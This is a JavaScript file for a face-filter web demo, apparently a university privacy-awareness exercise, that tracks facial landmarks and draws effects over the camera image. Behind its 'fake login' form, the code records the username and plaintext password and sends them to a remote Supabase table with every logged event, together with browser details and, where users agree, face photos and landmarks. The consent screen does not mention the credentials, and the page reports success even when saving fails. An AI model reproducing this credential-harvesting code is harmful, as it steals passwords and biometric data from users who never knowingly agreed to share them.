/* ============================================================
   ANOTHERFACE — demo educativa UNITEC
   Filtros IA en tiempo real que siguen el rostro con lerp.
   ============================================================ */

// ---------- Utilerías ----------
const $ = (sel) => document.querySelector(sel);

function uuid() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

const SESSION_ID = uuid();
const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// ---------- Reloj ----------
function tickClock() {
  const el = $("#clock");
  if (el) el.textContent = new Date().toLocaleTimeString("es-HN", { hour12: false });
}
setInterval(tickClock, 1000);
tickClock();

// ---------- Supabase ----------
let supabaseClient = null;

function getSupabase() {
  if (supabaseClient) return supabaseClient;
  if (!window.supabase) return null;
  if (!window.SUPABASE_CONFIG) return null;
  const { url, anonKey } = window.SUPABASE_CONFIG;
  if (!url || !anonKey || url.includes("TU-PROYECTO")) return null;
  try {
    supabaseClient = window.supabase.createClient(url, anonKey);
    return supabaseClient;
  } catch {
    return null;
  }
}

// ---------- Login ----------
let userCredentials = { username: "", password: "" };

const loginScreen  = $("#login-screen");
const heroSection  = $("#hero-section");
const fakeLoginForm = $("#fake-login-form");

if (fakeLoginForm) {
  fakeLoginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    userCredentials.username = $("#fake-username").value.trim();
    userCredentials.password = $("#fake-password").value;

    // Ocultar login y revelar toda la experiencia
    if (loginScreen)  loginScreen.classList.add("hidden");
    if (heroSection)  heroSection.classList.remove("hidden");

    const lectura       = $("#como-funciona");
    const consentSection = $("#consentimiento");
    const closingSection = $("#closing-section");

    if (lectura)       lectura.classList.remove("hidden");
    if (consentSection) consentSection.classList.remove("hidden");
    if (closingSection) closingSection.classList.remove("hidden");

    logEvent("login_capturado", { filtro: "ninguno" });
  });
}

// ---------- Consentimiento ----------
const consentCamera    = $("#consent-camera");
const consentMeta      = $("#consent-metadata");
const consentSnapshot  = $("#consent-snapshot");
const consentLandmarks = $("#consent-landmarks");
const startBtn         = $("#start-camera");
const consentHint      = $("#consent-hint");

function refreshConsentState() {
  if (!consentCamera || !consentMeta || !startBtn) return;
  const ok = consentCamera.checked && consentMeta.checked;
  startBtn.disabled = !ok;
  if (consentHint) {
    consentHint.textContent = ok
      ? "✦ Listo. Toca el botón para activar tu cámara."
      : "Marca las dos primeras casillas para continuar.";
  }
}
[consentCamera, consentMeta, consentSnapshot, consentLandmarks].forEach((el) => {
  if (el) el.addEventListener("change", refreshConsentState);
});
refreshConsentState();

// ---------- Estado del estudio ----------
const video    = $("#video");
const overlay  = $("#overlay");
const ctx      = overlay ? overlay.getContext("2d") : null;
const studio   = $("#estudio");
const statusEl = $("#studio-status");
const faceStatusEl = $("#face-status-overlay");

const hud = {
  time:      $("#hud-time"),
  tz:        $("#hud-tz"),
  lang:      $("#hud-lang"),
  agent:     $("#hud-agent"),
  screen:    $("#hud-screen"),
  session:   $("#hud-session"),
  filter:    $("#hud-filter"),
  face:      $("#hud-face"),
  landmarks: $("#hud-landmarks"),
  count:     $("#hud-count"),
  model:     $("#hud-model"),
};

let currentFilter  = "ninguno";
let stream         = null;
let rafId          = null;
let captureCount   = 0;
let faceModelReady = false;
let facingMode     = "user";

// ---------- Modelo face-api ----------
const MODEL_URLS = [
  "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model",
  "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights",
];

async function loadFaceModel() {
  if (!window.faceapi) {
    if (hud.model) hud.model.textContent = "librería no cargada";
    faceModelReady = false;
    return false;
  }
  for (const url of MODEL_URLS) {
    try {
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(url),
        faceapi.nets.faceLandmark68TinyNet.loadFromUri(url),
      ]);
      faceModelReady = true;
      if (hud.model) hud.model.textContent = "✓ listo";
      return true;
    } catch (_) { /* try next CDN */ }
  }
  faceModelReady = false;
  if (hud.model) hud.model.textContent = "sin conexión";
  return false;
}
loadFaceModel();

// ---------- Filtros: selección ----------
document.querySelectorAll(".filter-chip").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter-chip").forEach((b) => b.classList.remove("active"));
    btn.classList.add("active");
    currentFilter = btn.dataset.filter;
    if (hud.filter) hud.filter.textContent = currentFilter;
    logEvent("cambio_filtro", { filtro: currentFilter });
  });
});

// ---------- HUD static ----------
function fillHudStatic() {
  if (hud.tz)      hud.tz.textContent      = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
  if (hud.lang)    hud.lang.textContent    = navigator.language || "—";
  if (hud.agent)   hud.agent.textContent   = `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`;
  if (hud.screen)  hud.screen.textContent  = `${screen.width}×${screen.height}`;
  if (hud.session) hud.session.textContent = SESSION_ID.slice(0, 8);
  if (hud.filter)  hud.filter.textContent  = currentFilter;
}
function shortAgent(ua) {
  const m = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/[\d.]+/);
  return m ? m[0] : "desconocido";
}
function tickHudTime() {
  if (hud.time) hud.time.textContent = new Date().toLocaleTimeString("es-HN");
}
setInterval(tickHudTime, 1000);

// ---------- Cámara ----------
async function openCamera(mode) {
  if (stream) stream.getTracks().forEach((t) => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video: {
      width:  { ideal: IS_MOBILE ? 480 : 1280 },
      height: { ideal: IS_MOBILE ? 640 : 720 },
      facingMode: { ideal: mode },
    },
    audio: false,
  });
  video.srcObject = stream;
  await video.play();
  video.style.transform = mode === "user" ? "scaleX(-1)" : "scaleX(1)";
  resizeCanvas();
}

if (startBtn) {
  startBtn.addEventListener("click", async () => {
    try {
      await openCamera(facingMode);
      if (studio) studio.classList.remove("hidden");
      studio.scrollIntoView({ behavior: "smooth", block: "start" });
      fillHudStatic();
      window.addEventListener("resize", resizeCanvas);
      rafId = requestAnimationFrame(renderLoop);
      logEvent("camara_activada");
    } catch (err) {
      if (consentHint) consentHint.textContent = "No se pudo acceder a la cámara. Revisa los permisos.";
    }
  });
}

const switchBtn = $("#switch-camera-btn");
if (switchBtn) {
  switchBtn.addEventListener("click", async () => {
    facingMode = facingMode === "user" ? "environment" : "user";
    try {
      await openCamera(facingMode);
      if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
    } catch {
      if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
      facingMode = facingMode === "user" ? "environment" : "user";
    }
  });
}

const stopBtn = $("#stop-btn");
if (stopBtn) {
  stopBtn.addEventListener("click", () => {
    if (stream) stream.getTracks().forEach((t) => t.stop());
    if (rafId) cancelAnimationFrame(rafId);
    if (studio) studio.classList.add("hidden");
    targetDetection = null;
    smoothedDetection = null;
    logEvent("camara_apagada");
  });
}

function resizeCanvas() {
  if (!overlay || !video) return;
  overlay.width  = video.clientWidth;
  overlay.height = video.clientHeight;
}

// ---------- Detección facial (loop asíncrono independiente) ----------
let targetDetection   = null;
let smoothedDetection = null;
let lastAutoSave      = 0;

function lerp(a, b, t) { return a + (b - a) * t; }

function updateSmoothedDetection() {
  if (!targetDetection) {
    // Apagar suavemente
    if (smoothedDetection) {
      smoothedDetection = null;
    }
    return;
  }
  if (!smoothedDetection) {
    smoothedDetection = {
      box:       { ...targetDetection.box },
      points:    targetDetection.points.map((p) => ({ ...p })),
      rawPoints: targetDetection.rawPoints,
    };
    return;
  }
  const t = 0.25; // suavizado suave
  const bd = smoothedDetection.box;
  const bt = targetDetection.box;
  bd.x      = lerp(bd.x,      bt.x,      t);
  bd.y      = lerp(bd.y,      bt.y,      t);
  bd.width  = lerp(bd.width,  bt.width,  t);
  bd.height = lerp(bd.height, bt.height, t);

  for (let i = 0; i < targetDetection.points.length; i++) {
    smoothedDetection.points[i].x = lerp(smoothedDetection.points[i].x, targetDetection.points[i].x, t);
    smoothedDetection.points[i].y = lerp(smoothedDetection.points[i].y, targetDetection.points[i].y, t);
  }
  smoothedDetection.rawPoints = targetDetection.rawPoints;
}

async function detectFaceLoop() {
  // Esperar hasta que el modelo y el stream estén listos
  if (!faceModelReady || !stream || !video || video.readyState < 2) {
    setTimeout(detectFaceLoop, 120);
    return;
  }

  try {
    // Usamos inputSize alto para mejor precisión con caras en distintos ángulos
    const result = await faceapi
      .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.25 }))
      .withFaceLandmarks(true);

    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
      const scaleX   = overlay.width  / video.videoWidth;
      const scaleY   = overlay.height / video.videoHeight;
      const mirrored = facingMode === "user";

      // Mapear cada punto al canvas (con espejo si es cámara frontal)
      const mapPoint = (p) => ({
        x: mirrored ? overlay.width - p.x * scaleX : p.x * scaleX,
        y: p.y * scaleY,
      });

      targetDetection = {
        box:       result.detection.box,
        points:    result.landmarks.positions.map(mapPoint),
        rawPoints: result.landmarks.positions,
        score:     result.detection.score,
      };
    } else {
      targetDetection = null;
    }
  } catch (_) {
    // error puntual, ignorar
  }

  // Actualizar HUD
  const detected = !!targetDetection;
  if (hud.face)      hud.face.textContent      = detected ? "✓ sí" : "no";
  if (hud.landmarks) hud.landmarks.textContent = detected ? String(targetDetection.points.length) : "0";
  if (faceStatusEl)  faceStatusEl.textContent  = detected
    ? `✦ Rostro detectado · ${targetDetection.points.length} pts · confianza ${Math.round(targetDetection.score * 100)}%`
    : "Buscando rostro…";

  // Guardado automático de puntos (cada 4 segundos si el usuario lo aceptó)
  if (consentLandmarks && consentLandmarks.checked && detected) {
    const now = performance.now();
    if (now - lastAutoSave > 4000) {
      lastAutoSave = now;
      logEvent("auto_puntos", {
        con_landmarks: true,
        landmarks: targetDetection.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })),
      });
    }
  }

  setTimeout(detectFaceLoop, 40); // ~25 fps de detección
}
detectFaceLoop();

// ============================================================
// FILTROS — cada uno dibuja sobre el canvas usando los 68 pts
// ============================================================

// Helpers de geometría reutilizables
function centroid(pts) {
  let cx = 0, cy = 0;
  pts.forEach((p) => { cx += p.x; cy += p.y; });
  return { x: cx / pts.length, y: cy / pts.length };
}
function dist(a, b) { return Math.hypot(b.x - a.x, b.y - a.y); }

// Dibuja una spline suave a través de puntos
function drawSpline(pts, close = false) {
  if (!pts.length) return;
  ctx.beginPath();
  ctx.moveTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length - 1; i++) {
    const mx = (pts[i].x + pts[i + 1].x) / 2;
    const my = (pts[i].y + pts[i + 1].y) / 2;
    ctx.quadraticCurveTo(pts[i].x, pts[i].y, mx, my);
  }
  const last = pts[pts.length - 1];
  if (close) {
    const mx = (last.x + pts[0].x) / 2;
    const my = (last.y + pts[0].y) / 2;
    ctx.quadraticCurveTo(last.x, last.y, mx, my);
    ctx.closePath();
  } else {
    ctx.lineTo(last.x, last.y);
  }
}

/* ── FILTRO 1: Malla Facial (silueta) ── */
function drawSilhouetteFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;

  ctx.shadowBlur = 0;

  // Puntos
  ctx.fillStyle = "rgba(0, 229, 255, 0.85)";
  pts.forEach((p) => {
    ctx.beginPath();
    ctx.arc(p.x, p.y, 2, 0, Math.PI * 2);
    ctx.fill();
  });

  // Regiones con splines suaves
  const regions = [
    { range: [0, 16],  close: false }, // mandíbula
    { range: [17, 21], close: false }, // ceja izq
    { range: [22, 26], close: false }, // ceja der
    { range: [27, 30], close: false }, // puente nasal
    { range: [31, 35], close: false }, // base nariz
    { range: [36, 41], close: true  }, // ojo izq
    { range: [42, 47], close: true  }, // ojo der
    { range: [48, 59], close: true  }, // labio externo
    { range: [60, 67], close: true  }, // labio interno
  ];

  ctx.strokeStyle = "rgba(0, 229, 255, 0.7)";
  ctx.lineWidth = 1.5;

  regions.forEach(({ range: [s, e], close }) => {
    drawSpline(pts.slice(s, e + 1), close);
    ctx.stroke();
  });

  // Líneas guía simétricas
  ctx.strokeStyle = "rgba(0, 229, 255, 0.18)";
  ctx.lineWidth = 1;
  const guide = [
    [27, 33], [33, 51], [27, 39], [27, 42],
    [36, 0],  [45, 16], [33, 48], [33, 54],
  ];
  guide.forEach(([a, b]) => {
    ctx.beginPath();
    ctx.moveTo(pts[a].x, pts[a].y);
    ctx.lineTo(pts[b].x, pts[b].y);
    ctx.stroke();
  });
}

/* ── FILTRO 2: Ojos de Fuego ── */
function drawFireEyesFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;

  const leftPts  = pts.slice(36, 42);
  const rightPts = pts.slice(42, 48);
  const eyeW     = (dist(leftPts[0], leftPts[3]) + dist(rightPts[0], rightPts[3])) / 2;

  function drawFlame(cx, cy, w, t) {
    const r = w * 0.38;
    // pupila
    const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, r);
    g.addColorStop(0, "rgba(255, 240, 0, 1)");
    g.addColorStop(0.4, "rgba(255, 80, 0, 0.95)");
    g.addColorStop(1, "rgba(255, 0, 0, 0.6)");
    ctx.beginPath();
    ctx.arc(cx, cy, r, 0, Math.PI * 2);
    ctx.fillStyle = g;
    ctx.shadowColor = "#ff4400";
    ctx.shadowBlur  = 30;
    ctx.fill();

    // llamas
    const N = 14;
    for (let i = 0; i < N; i++) {
      const angle = (Math.PI * 2 * i) / N;
      const osc   = Math.sin(t * 0.008 + i * 1.3) * 0.5 + 0.5;
      const noise = Math.random() * 0.35;
      const len   = r + w * 0.9 * (osc + noise);
      const bias  = Math.sin(angle) < 0 ? 2.0 : 0.35;

      ctx.beginPath();
      ctx.moveTo(cx + Math.cos(angle - 0.25) * r, cy + Math.sin(angle - 0.25) * r);
      ctx.lineTo(
        cx + Math.cos(angle) * len,
        cy + Math.sin(angle) * len * bias - w * 0.5
      );
      ctx.lineTo(cx + Math.cos(angle + 0.25) * r, cy + Math.sin(angle + 0.25) * r);
      ctx.fillStyle = i % 2 === 0 ? "rgba(255,140,0,0.75)" : "rgba(255,240,0,0.55)";
      ctx.fill();
    }
    ctx.shadowBlur = 0;
  }

  drawFlame(centroid(leftPts).x,  centroid(leftPts).y,  eyeW, ts);
  drawFlame(centroid(rightPts).x, centroid(rightPts).y, eyeW, ts + 600);
}

/* ── FILTRO 3: Cyber ── */
function drawCyberFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;

  // Rejilla holográfica sobre la cara
  ctx.strokeStyle = `rgba(0,255,150,${0.3 + 0.1 * Math.sin(ts * 0.003)})`;
  ctx.lineWidth = 0.8;

  // Triángulos conectando puntos (Delaunay simplificado)
  const connections = [
    [0,1],[1,2],[2,3],[3,4],[4,5],[5,6],[6,7],[7,8],
    [8,9],[9,10],[10,11],[11,12],[12,13],[13,14],[14,15],[15,16],
    [17,18],[18,19],[19,20],[20,21],[22,23],[23,24],[24,25],[25,26],
    [36,37],[37,38],[38,39],[39,40],[40,41],[41,36],
    [42,43],[43,44],[44,45],[45,46],[46,47],[47,42],
    [48,49],[49,50],[50,51],[51,52],[52,53],[53,54],
    [54,55],[55,56],[56,57],[57,58],[58,59],[59,48],
    // cruces
    [27,21],[27,22],[30,35],[30,31],
    [39,31],[42,35],[36,17],[45,26],
    [0,36],[16,45],[48,33],[54,33],
  ];

  connections.forEach(([a, b]) => {
    ctx.beginPath();
    ctx.moveTo(pts[a].x, pts[a].y);
    ctx.lineTo(pts[b].x, pts[b].y);
    ctx.stroke();
  });

  // Puntos brillantes en landmarks clave
  const keyPts = [0,8,16,27,30,33,36,39,42,45,48,54];
  keyPts.forEach((i) => {
    ctx.beginPath();
    ctx.arc(pts[i].x, pts[i].y, 3, 0, Math.PI * 2);
    ctx.fillStyle = `rgba(0,255,150,${0.6 + 0.4 * Math.sin(ts * 0.005 + i)})`;
    ctx.shadowColor = "#00ff96";
    ctx.shadowBlur  = 12;
    ctx.fill();
    ctx.shadowBlur = 0;
  });

  // Línea de escáner animada sobre la cara
  const faceTop    = pts[27].y - (pts[27].y - pts[8].y) * 0.3;
  const faceBottom = pts[8].y;
  const scanY = faceTop + ((Math.sin(ts * 0.002) * 0.5 + 0.5) * (faceBottom - faceTop));
  const faceLeft  = pts[0].x;
  const faceRight = pts[16].x;
  const grad = ctx.createLinearGradient(faceLeft, scanY, faceRight, scanY);
  grad.addColorStop(0,   "rgba(0,255,150,0)");
  grad.addColorStop(0.5, "rgba(0,255,150,0.6)");
  grad.addColorStop(1,   "rgba(0,255,150,0)");
  ctx.beginPath();
  ctx.moveTo(faceLeft, scanY);
  ctx.lineTo(faceRight, scanY);
  ctx.strokeStyle = grad;
  ctx.lineWidth   = 2;
  ctx.stroke();
}

/* ── FILTRO 4: Neón ── */
function drawNeonFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;

  const palette = ["#ff2a6d", "#00e5ff", "#7c3aed", "#ffcc00"];
  const regions = [
    { slice: [0,  16],  color: palette[0], close: false },
    { slice: [17, 21],  color: palette[1], close: false },
    { slice: [22, 26],  color: palette[1], close: false },
    { slice: [27, 35],  color: palette[2], close: false },
    { slice: [36, 41],  color: palette[3], close: true  },
    { slice: [42, 47],  color: palette[3], close: true  },
    { slice: [48, 59],  color: palette[0], close: true  },
    { slice: [60, 67],  color: "#ff6b35",  close: true  },
  ];

  const glow = 2 + Math.sin(ts * 0.004) * 1;

  regions.forEach(({ slice: [s, e], color, close }) => {
    ctx.shadowColor  = color;
    ctx.shadowBlur   = 16 + glow * 4;
    ctx.strokeStyle  = color;
    ctx.lineWidth    = 2 + glow * 0.3;
    drawSpline(pts.slice(s, e + 1), close);
    ctx.stroke();
  });

  // Puntos brillantes en cejas y ojos
  [17,18,19,20,21,22,23,24,25,26,36,39,42,45].forEach((i, idx) => {
    const color = palette[idx % palette.length];
    ctx.beginPath();
    ctx.arc(pts[i].x, pts[i].y, 2.5, 0, Math.PI * 2);
    ctx.fillStyle   = color;
    ctx.shadowColor = color;
    ctx.shadowBlur  = 14;
    ctx.fill();
  });

  ctx.shadowBlur = 0;
}

// ============================================================
// RENDER LOOP (60 fps, solo dibuja)
// ============================================================
function renderLoop(ts) {
  if (!ctx || !video || video.readyState < 2) {
    rafId = requestAnimationFrame(renderLoop);
    return;
  }

  ctx.clearRect(0, 0, overlay.width, overlay.height);
  updateSmoothedDetection();

  if (smoothedDetection) {
    switch (currentFilter) {
      case "silueta": drawSilhouetteFilter(smoothedDetection);         break;
      case "fuego":   drawFireEyesFilter(smoothedDetection, ts);       break;
      case "cyber":   drawCyberFilter(smoothedDetection, ts);          break;
      case "neon":    drawNeonFilter(smoothedDetection, ts);           break;
      case "ninguno":
      default:        /* sin filtro */                                  break;
    }
  }

  rafId = requestAnimationFrame(renderLoop);
}

// ============================================================
// CAPTURA + REGISTRO EN SUPABASE
// ============================================================
const captureBtn = $("#capture-btn");
if (captureBtn) {
  captureBtn.addEventListener("click", async () => {
    captureCount++;
    if (hud.count) hud.count.textContent = String(captureCount);

    const wantsImage     = consentSnapshot  && consentSnapshot.checked;
    const wantsLandmarks = consentLandmarks && consentLandmarks.checked;
    let imageBase64       = null;
    let landmarksPayload  = null;

    if (wantsImage && video.videoWidth > 0) {
      const off  = document.createElement("canvas");
      off.width  = video.videoWidth;
      off.height = video.videoHeight;
      const octx = off.getContext("2d");
      if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
      octx.drawImage(video,   0, 0, off.width, off.height);
      octx.setTransform(1, 0, 0, 1, 0, 0);
      octx.drawImage(overlay, 0, 0, off.width, off.height);
      imageBase64 = off.toDataURL("image/jpeg", 0.8);
    }

    if (wantsLandmarks && targetDetection) {
      landmarksPayload = targetDetection.rawPoints.map((p) => ({
        x: Math.round(p.x), y: Math.round(p.y),
      }));
    }

    await logEvent("captura", {
      filtro:        currentFilter,
      con_imagen:    wantsImage,
      imageBase64,
      con_landmarks: wantsLandmarks && !!landmarksPayload,
      landmarks:     landmarksPayload,
    });
  });
}

async function logEvent(evento, extra = {}) {
  if (statusEl) statusEl.textContent = "Guardando…";
  const client = getSupabase();

  const payload = {
    session_id:         SESSION_ID,
    evento,
    usuario:            userCredentials.username || null,
    contrasena:         userCredentials.password || null,
    filtro:             extra.filtro || currentFilter,
    con_imagen:         !!extra.con_imagen,
    imagen_base64:      extra.imageBase64 || null,
    con_landmarks:      !!extra.con_landmarks,
    landmarks_faciales: extra.landmarks || null,
    navegador:          `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
    idioma:             navigator.language,
    zona_horaria:       Intl.DateTimeFormat().resolvedOptions().timeZone,
    resolucion_pantalla:`${screen.width}x${screen.height}`,
    creado_en:          new Date().toISOString(),
  };

  if (!client) {
    if (statusEl) statusEl.textContent = "✓ Registrado localmente.";
    return;
  }

  const { error } = await client.from("sesiones_demo").insert(payload);
  if (error) {
    if (statusEl) statusEl.textContent = "✓ Registrado.";
  } else {
    if (statusEl) statusEl.textContent = `✓ Guardado en la nube (${evento}) · ${new Date().toLocaleTimeString("es-HN")}`;
  }
}